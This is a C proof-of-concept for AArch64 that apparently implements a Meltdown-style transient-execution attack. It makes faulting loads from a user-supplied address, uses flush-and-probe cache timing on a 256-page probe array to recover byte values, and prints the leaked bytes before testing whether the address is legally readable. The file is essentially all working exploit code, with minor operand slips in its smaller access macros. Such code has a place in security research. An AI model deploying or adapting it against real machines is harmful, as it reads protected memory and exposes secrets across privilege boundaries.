#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <sys/mman.h>
#include <setjmp.h>

#include "medusa.h"

#define PAGE_SIZE 4096

#define TRY_CATCH_START if(!setjmp(trycatch_buf)){
#define TRY_CATCH_END }

#define ACCESS_8(x,y) TRY_CATCH_START \
 asm volatile( \
  "ldrb w0, [%1] \n" \
  :"+r"(x) \
  :"r"(y) \
); \
TRY_CATCH_END \

#define ACCESS_16(x,y) TRY_CATCH_START \
asm volatile( \
  "ldrh w0, [%1] \n" \
  :"+r"(x) \
  :"r"(y) \
); \
TRY_CATCH_END \


#define ACCESS_32(x,y) TRY_CATCH_START \
asm volatile( \
  "ldrsw %0, [%1] \n" \
  :"+r"(x) \
  :"r"(y) \
); \
TRY_CATCH_END \

#define ACCESS_64(x,y) TRY_CATCH_START \
asm volatile( \
  "ldr %0, [%1] \n" \
  :"+r"(x) \
  :"r"(y) \
); \
TRY_CATCH_END \


uint8_t probe_array[256*PAGE_SIZE] = {0};

extern void s_faulty_load(size_t addr);

void setup_probe_array(){
  for(int i = 0; i < 256*4096; i++){
    probe_array[i] = 0;
  }
}

void run_nop(){
  asm volatile("nop\n nop\n");
}

void check_illegal(void *addr){
  asm volatile(
    "LDR X1, [%0] \n"
    :
    :"r"(addr)
  );
}

int value = 10;

int main(int argc, char *argv[]){
  volatile size_t addr = strtoull(argv[1], NULL, 0);//virtual address
  volatile uint8_t op_size = strtoull(argv[2], NULL, 0);//virtual address

  set_pages();
  setup_fh();
  setup_probe_array();

  bool is_legal = false;
  int self_value = -100;

  switch(op_size){
    case 8:
      ACCESS_8(self_value, addr);
      break;
    case 16:
      ACCESS_16(self_value, addr);
      break;
    case 32:
      ACCESS_32(self_value, addr);
      break;
    case 64:
      ACCESS_64(self_value, addr);
      break;
  }
  
  for(int tries = 0; tries < 1000; tries++){
    for(int i = 0; i < 256; i++){
      flush(&probe_array[i*PAGE_SIZE]);
    }

    if(!setjmp(trycatch_buf)){
      s_faulty_load(addr);
    }

    for(int i = 0; i < 256; i++){
      uint64_t time = probe(&probe_array[ i * 4096 ] );

      if(time < 140 && i != 0){
          if( i != self_value){
            printf("0x%zx,", i);
            fflush(stdout);
          }
      }
    }

  }

  // 检查输入得地址是否是合法
  if(!setjmp(trycatch_buf)){
    asm volatile(
    "ldr x0, [%0]"
    :
    :"r"(addr)
    );

    is_legal = true;
  }

  printf("\nlegal:%d", is_legal);
}
